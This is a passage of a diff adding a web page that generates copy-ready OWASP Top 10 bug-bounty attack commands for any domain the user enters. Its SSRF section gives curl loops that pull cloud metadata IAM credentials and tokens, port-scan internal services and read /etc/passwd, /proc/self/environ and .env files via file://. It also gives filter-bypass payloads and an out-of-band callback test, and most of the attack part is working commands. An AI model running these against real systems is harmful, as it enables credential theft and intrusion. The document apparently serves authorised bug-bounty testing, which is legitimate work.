+       e:"Checks whether sensitive user operations generate audit log entries visible in the application. If changing passwords, updating email, or modifying account settings produces no log entries the application cannot detect account takeover or insider threats through normal monitoring."}
+    ]
+  },
+  {
+    id:"a10", icon:"&#127968;", badge:"b-a10",
+    title:"A10 — Server-Side Request Forgery (SSRF)",
+    desc:"SSRF flaws occur whenever a web application fetches a remote resource without validating the user-supplied URL. Attackers can force the server to connect to internal services, cloud metadata endpoints, and arbitrary external systems.",
+    where:"Look in any parameter that accepts a URL: webhook URLs, avatar/image URL imports, PDF generators from URLs, export/import features, URL preview/unfurl endpoints, feed aggregators, and any parameter named url, path, src, href, dest, redirect, or fetch. Test every file upload that accepts remote URLs. Look in HTTP headers like Referer too.",
+    exploit:"Inject http://169.254.169.254/latest/meta-data/ to steal AWS instance metadata and IAM credentials. Access http://localhost/admin to reach internal admin panels. Scan internal network by trying RFC-1918 addresses (192.168.x.x, 10.x.x.x). Read internal services on non-standard ports. Use file:// to read local files. Chain with open redirect to bypass URL allowlists.",
+    tip:"AWS metadata IMDSv1 at 169.254.169.254 is the single highest-impact SSRF target. The /latest/meta-data/iam/security-credentials/ path returns temporary AWS access keys. Always try this first. For GCP try metadata.google.internal and for Azure try 169.254.169.254/metadata/instance.",
+    warn:"Never use SSRF to access actual internal services beyond what is needed for the PoC. Reading AWS metadata to get the instance role name is sufficient proof. Do not use SSRF to pivot into the internal network, access databases, or exfiltrate data beyond the minimal PoC.",
+    flags:[
+      {f:"-m 10", d:"curl: max timeout (internal services may be slow to respond)"},
+      {f:"--noproxy '*'", d:"curl: bypass proxy to ensure direct connection"},
+      {f:"-L", d:"curl: follow redirects (important for SSRF via open redirects)"},
+      {f:"--resolve HOST:PORT:IP", d:"curl: force hostname resolution to specific IP for SSRF testing"},
+      {f:"-H 'Content-Type: application/json'", d:"Required for JSON API SSRF parameter injection"}
+    ],
+    cmds:[
+      {l:"AWS metadata SSRF test", r:"critical",
+       c:"for meta_url in 'http://169.254.169.254/latest/meta-data/' 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' 'http://169.254.169.254/latest/user-data'; do echo \"=== $meta_url ===\"; curl -s -m 10 \"https://{T}/fetch?url=$(python3 -c \\\"import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))\\\" $meta_url)\" | head -5; done",
+       e:"Tests for SSRF by attempting to access AWS instance metadata through the target server. A response containing ami-id, instance-id, or IAM role names confirms SSRF. IAM security-credentials returning accessKeyId and secretAccessKey is a critical finding worth maximum bounty."},
+      {l:"Internal network port scan via SSRF", r:"high",
+       c:"for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do resp=$(curl -s -m 3 \"https://{T}/proxy?url=http://127.0.0.1:$port\" -o /dev/null -w '%{http_code}:%{time_total}'); echo \"localhost:$port -> $resp\"; done",
+       e:"Uses SSRF to probe open ports on localhost by measuring response codes and response times. A 200 or non-timeout response to an internal port confirms that port is open and accessible from the server. Redis on 6379, MySQL on 3306, and Elasticsearch on 9200 are high-value internal targets."},
+      {l:"OOB SSRF with DNS callback", r:"high",
+       c:"COLLAB='YOUR.INTERACTSH.SERVER' && curl -s \"https://{T}/import?url=http://$COLLAB/ssrf-$(date +%s)\" -o /dev/null -w 'HTTP: %{http_code}' && echo '' && echo 'Check interactsh/collaborator for incoming DNS or HTTP request'",
+       e:"Tests for blind SSRF using an out-of-band DNS callback. Replace YOUR.INTERACTSH.SERVER with an interactsh or Burp Collaborator domain. If your callback server receives an incoming request from the target's IP the server is making outbound requests based on your input confirming blind SSRF."},
+      {l:"SSRF via file:// protocol", r:"critical",
+       c:"for path in '/etc/passwd' '/etc/hosts' '/proc/self/environ' '/var/www/html/.env'; do encoded=$(python3 -c \"import urllib.parse,sys;print(urllib.parse.quote('file://'+sys.argv[1]))\" $path); resp=$(curl -s -m 5 \"https://{T}/render?url=$encoded\"); echo \"$resp\" | grep -q 'root:' && echo \"FILE READ via file:// SSRF: $path\"; done",
+       e:"Tests if the SSRF vulnerability allows file:// protocol to read local files. If the server does not block non-HTTP schemes file:// SSRF is equivalent to LFI. Reading /etc/passwd confirms file read. Reading /proc/self/environ may expose environment variables with secrets."},
+      {l:"SSRF filter bypass techniques", r:"high",
+       c:"TARGET_URL='https://{T}/fetch?url=' && for bypass in 'http://127.0.0.1/' 'http://0.0.0.0/' 'http://[::1]/' 'http://localhost/' 'http://127.1/' 'http://2130706433/' 'http://0177.0.0.1/'; do code=$(curl -s -o /dev/null -w '%{http_code}' \"${TARGET_URL}$(python3 -c \\\"import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))\\\" $bypass)\"); echo \"$bypass -> HTTP $code\"; done",
+       e:"Tests multiple localhost representation bypasses for SSRF filter evasion. Applications blocking 'localhost' and '127.0.0.1' often miss decimal notation (2130706433), octal (0177.0.0.1), IPv6 (::1), and short IP (127.1) representations. A different HTTP response to any bypass confirms filter evasion."},
+      {l:"GCP/Azure metadata SSRF test", r:"critical",
+       c:"for url in 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 'http://100.100.100.200/latest/meta-data/'; do echo \"=== $url ===\"; curl -s -m 8 \"https://{T}/api/preview?target=$(python3 -c \\\"import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))\\\" $url)\" | head -5; done",
+       e:"Tests cloud metadata endpoints for GCP, Azure, and Alibaba Cloud in addition to AWS. GCP metadata requires the Metadata-Flavor header but misconfigured SSRF protections sometimes allow it. Azure metadata at 169.254.169.254 with the api-version query parameter returns VM identity tokens."}
+    ]
+  }
+];
+
+var TARGET="", FILTER="all", QUERY="", VIEW="cards";
+
+function esc(s){return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");}
+function validDomain(t){var d=t.trim().replace(/^https?:\/\//i,"").replace(/\/.*/,"");return /^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/.test(d)||/^[a-zA-Z0-9][a-zA-Z0-9\-]{0,61}$/.test(d)||/^(\d{1,3}\.){3}\d{1,3}$/.test(d);}
+function cleanDomain(t){return t.trim().replace(/^https?:\/\//i,"").replace(/\/.*/,"").replace(/\/$/,"");}
+function fillCmd(c){return c.replace(/\{T\}/g,TARGET);}
+function totalCmds(){var n=0;for(var i=0;i<CATS.length;i++)n+=CATS[i].cmds.length;return n;}
+
+function colorize(raw){
+  var s=esc(fillCmd(raw));
+  s=s.replace(/^([a-zA-Z0-9_\-\.\/]+)/,'<span class="kw">$1</span>');
+  s=s.replace(/(\s)(--?[a-zA-Z][a-zA-Z0-9\-_\.]*)/g,'$1<span class="fl">$2</span>');
+  if(TARGET){var et=esc(TARGET);s=s.replace(new RegExp(et.replace(/[.*+?^${}()|[\]\\]/g,"\\$&"),"g"),'<span class="tgt">'+et+"</span>");}
+  return s;
+}
+
+function getVisibleCats(){
+  return CATS.filter(function(cat){
+    if(FILTER!=="all"&&cat.id!==FILTER)return false;
+    if(!QUERY)return true;
+    var q=QUERY.toLowerCase();
+    if(cat.title.toLowerCase().indexOf(q)>=0||cat.desc.toLowerCase().indexOf(q)>=0)return true;
+    if(cat.where&&cat.where.toLowerCase().indexOf(q)>=0)return true;
+    if(cat.exploit&&cat.exploit.toLowerCase().indexOf(q)>=0)return true;
+    for(var i=0;i<cat.cmds.length;i++){var cm=cat.cmds[i];if(cm.l.toLowerCase().indexOf(q)>=0||cm.c.toLowerCase().indexOf(q)>=0||cm.e.toLowerCase().indexOf(q)>=0)return true;}
+    return false;
+  });
+}
+
+function getFilteredCmds(cat){
+  if(!QUERY)return cat.cmds;
+  var q=QUERY.toLowerCase();
+  return cat.cmds.filter(function(cm){return cm.l.toLowerCase().indexOf(q)>=0||cm.c.toLowerCase().indexOf(q)>=0||cm.e.toLowerCase().indexOf(q)>=0;});
+}
+
+function doCopy(text,btn){
+  var orig=btn.textContent;
+  function ok(){btn.textContent="Copied!";btn.classList.add("ok");setTimeout(function(){btn.textContent=orig;btn.classList.remove("ok");},2000);}
+  function fb(){var ta=document.createElement("textarea");ta.value=text;ta.style.cssText="position:fixed;top:-9999px;opacity:0;";document.body.appendChild(ta);ta.focus();ta.select();try{document.execCommand("copy");ok();}catch(e){}document.body.removeChild(ta);}
+  if(navigator.clipboard&&window.isSecureContext)navigator.clipboard.writeText(text).then(ok,fb);else fb();
+}
+function copyFromBlock(bid,btn){var el=document.getElementById(bid);if(!el)return;var pre=el.querySelector(".dpre");if(!pre)return;doCopy(pre.innerText.trim(),btn);}
+function copyInline(btn){doCopy(btn.getAttribute("data-v"),btn);}
+
+function doGenerate(){
+  var raw=document.getElementById("targetInput").value;
+  var errBox=document.getElementById("errbox");
+  if(!raw||!raw.trim()||!validDomain(raw)){errBox.style.display="block";return;}
+  errBox.style.display="none";
+  TARGET=cleanDomain(raw);FILTER="all";QUERY="";
+  var si=document.getElementById("searchInput");if(si)si.value="";
+  document.getElementById("sc1").textContent=CATS.length;
+  document.getElementById("sc2").textContent=totalCmds();
+  document.getElementById("sc3").textContent=TARGET;
+  document.getElementById("statsbar").style.display="flex";
+  document.getElementById("toolbar").style.display="flex";
+  document.getElementById("pills").style.display="flex";
+  document.getElementById("mainLayout").style.display="grid";
+  buildSidebar();buildPills();render();
+  setTimeout(function(){document.getElementById("mainLayout").scrollIntoView({behavior:"smooth",block:"start"});},100);
+}
+
+function buildSidebar(){
+  var h='<div class="sbt">Navigation</div><button class="sbtn on" data-cat="all"><span class="sbico">&#128203;</span><span class="sblbl">All OWASP Top 10</span><span class="sbcnt">'+CATS.length+'</span></button><div class="sbsep"></div><div class="sbt">OWASP Categories</div>';
+  for(var i=0;i<CATS.length;i++){var c=CATS[i];h+='<button class="sbtn" data-cat="'+c.id+'"><span class="sbico">'+c.icon+'</span><span class="sblbl">'+esc(c.title)+'</span><span class="sbcnt">'+c.cmds.length+'</span></button>';}
+  var sb=document.getElementById("sidebar");sb.innerHTML=h;
+  sb.querySelectorAll(".sbtn[data-cat]").forEach(function(btn){btn.addEventListener("click",function(){setFilter(this.getAttribute("data-cat"));});});
+}
+
+function buildPills(){
+  var h='<span class="pill on" data-cat="all">All</span>';
+  for(var i=0;i<CATS.length;i++)h+='<span class="pill" data-cat="'+CATS[i].id+'">'+CATS[i].icon+' '+esc(CATS[i].title)+'</span>';
+  var container=document.getElementById("pills");container.innerHTML=h;
+  container.querySelectorAll(".pill").forEach(function(pill){pill.addEventListener("click",function(){setFilter(this.getAttribute("data-cat"));});});
+}
+
+function setFilter(id){
+  FILTER=id;
+  document.querySelectorAll(".pill").forEach(function(p){p.classList.toggle("on",p.getAttribute("data-cat")===id);});
+  document.querySelectorAll(".sbtn[data-cat]").forEach(function(b){b.classList.toggle("on",b.getAttribute("data-cat")===id);});
+  render();
+}
+function setView(v){VIEW=v;document.getElementById("vcard").classList.toggle("on",v==="cards");document.getElementById("vcomp").classList.toggle("on",v==="compact");render();}
+function togParams(wid,tid){var w=document.getElementById(wid),t=document.getElementById(tid);if(!w||!t)return;var o=w.classList.contains("open");w.classList.toggle("open",!o);t.classList.toggle("open",!o);}
+
+function render(){
+  var content=document.getElementById("content");var cats=getVisibleCats();
+  if(!cats.length){content.innerHTML='<div class="nores"><h3>No commands found</h3><p>Try a different search term or select a different OWASP category.</p></div>';return;}
+  if(VIEW==="compact")renderCompact(content,cats);else renderCards(content,cats);
+}
+
+function renderCards(content,cats){
+  var html="";
+  for(var i=0;i<cats.length;i++){
+    var cat=cats[i],cmds=getFilteredCmds(cat);if(!cmds.length)continue;
+    html+='<div class="sec" id="sec-'+cat.id+'"><div class="sechdr"><span class="secico">'+cat.icon+'</span><div><div class="sectitle">'+esc(cat.title)+'</div><div class="secsub">'+esc(cat.desc)+'</div></div><span class="seccnt">'+cmds.length+' cmd'+(cmds.length!==1?'s':'')+'</span></div>';
+    if(cat.where||cat.exploit){
+      html+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:.6rem;margin-bottom:.75rem">';
+      if(cat.where)html+='<div class="whereblock"><div class="wblbl">&#128269; Where to Look</div>'+esc(cat.where)+'</div>';
+      if(cat.exploit)html+='<div class="exploitblock"><div class="explbl">&#9889; How to Exploit</div>'+esc(cat.exploit)+'</div>';
+      html+='</div>';
+    }
+    html+='<div class="grid">';
+    for(var j=0;j<cmds.length;j++)html+=buildCard(cat,cmds[j],cat.id+"_"+j);
+    html+='</div></div>';
+  }
+  content.innerHTML=html;
+}
+
+function buildCard(cat,cm,uid){
+  var bid="blk_"+uid,ptid="pt_"+uid,togid="ptog_"+uid,risk=cm.r||"info";
+  var h='<div class="card"><div class="ch"><div class="ctrow"><span class="cname">'+esc(cm.l)+'</span><div class="cbadges"><span class="bdg '+cat.badge+'">'+esc(cat.id.toUpperCase())+'</span><span class="rb r-'+risk+'">'+risk+'</span></div></div><div class="what"><div class="wlbl">What This Command Does</div>'+esc(cm.e)+'</div></div>';
+  h+='<div class="cb"><div class="dblk" id="'+bid+'"><div class="dbar"><div class="dbar-l"><div class="dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span style="font-family:var(--mono);font-size:.66rem;color:var(--mut)">terminal</span></div><div class="dbar-r"><span class="rb r-'+risk+'">'+risk+'</span><button class="cbtn" onclick="copyFromBlock(\''+bid+'\',this)">Copy</button></div></div><pre class="dpre">'+colorize(cm.c)+'</pre></div>';
+  if(cat.flags&&cat.flags.length){
+    h+='<button class="ptog" id="'+togid+'" onclick="togParams(\''+ptid+'\',\''+togid+'\')"><span>Flags Reference ('+cat.flags.length+')</span><span class="arr">&#9660;</span></button><div class="pwrap" id="'+ptid+'"><table class="ptbl"><thead><tr><th>Flag</th><th>Description</th></tr></thead><tbody>';
+    for(var k=0;k<cat.flags.length;k++)h+='<tr><td class="pf">'+esc(cat.flags[k].f)+'</td><td class="pd">'+esc(cat.flags[k].d)+'</td></tr>';
+    h+='</tbody></table></div>';
+  }
+  if(cat.tip)h+='<div class="tip"><span>&#128161;</span><span>'+esc(cat.tip)+'</span></div>';
+  if(cat.warn)h+='<div class="wrn"><span>&#9888;</span><span>'+esc(cat.warn)+'</span></div>';
+  h+='</div></div>';
+  return h;
+}
+
+function renderCompact(content,cats){
+  var html='<div class="ctable"><div class="chdr"><div>Command Name</div><div>Command</div><div>Risk</div><div>Copy</div></div>';
+  for(var i=0;i<cats.length;i++){var cmds=getFilteredCmds(cats[i]);for(var j=0;j<cmds.length;j++){var cm=cmds[j],risk=cm.r||"info",filled=fillCmd(cm.c);html+='<div class="crow"><span class="cr-name" title="'+esc(cm.e)+'">'+cats[i].icon+' '+esc(cm.l)+'</span><span class="cr-cmd" title="'+esc(filled)+'">'+esc(filled)+'</span><span><span class="rb r-'+risk+'">'+risk+'</span></span><span class="cr-act"><button class="crc" data-v="'+esc(filled)+'" onclick="copyInline(this)">Copy</button></span></div>';}}
+  html+='</div>';content.innerHTML=html;
+}
+
+(function(){
+  document.getElementById("generateBtn").addEventListener("click",function(e){e.preventDefault();doGenerate();});
+  document.getElementById("targetInput").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();doGenerate();}});
+  var si=document.getElementById("searchInput");
+  function doSearch(){QUERY=si.value.trim();if(TARGET)render();}
+  si.addEventListener("input",doSearch);si.addEventListener("keyup",doSearch);si.addEventListener("change",doSearch);
+  document.getElementById("vcard").addEventListener("click",function(){setView("cards");});
+  document.getElementById("vcomp").addEventListener("click",function(){setView("compact");});
+})();
+</script>
+</body>
+</html>
